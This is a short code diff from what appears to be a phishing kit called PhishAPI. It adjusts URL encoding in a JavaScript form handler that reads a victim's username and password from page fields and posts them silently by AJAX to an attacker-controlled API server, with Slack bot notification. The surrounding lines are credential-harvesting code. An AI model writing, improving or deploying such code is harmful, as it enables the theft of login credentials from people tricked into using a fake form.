@@ -38,7 +38,7 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
 	var SlackEmoji = SubForm.arguments[4];
 	var UsernameInputID = SubForm.arguments[5];
 	var PasswordInputID = SubForm.arguments[6];
-	var RedirURL = encodeURI(SubForm.arguments[7]);
+	var RedirURL = encodeURIComponent(SubForm.arguments[7]);
 	var CSRFToken = SubForm.arguments[8];
 	// Vistim Controlled Variables
 	var Username = document.getElementById(UsernameInputID).value;
@@ -56,7 +56,7 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
         // Post Transparent AJAX Request to PhishAPI Server
 		url:APIPortal,
         type:'post',
-		data:encodeURI(URL),
+		data:URL,
         success:function (msg){		
 		
 				// Grab Remote CSRF Token if Provided and Update Input Field to Match
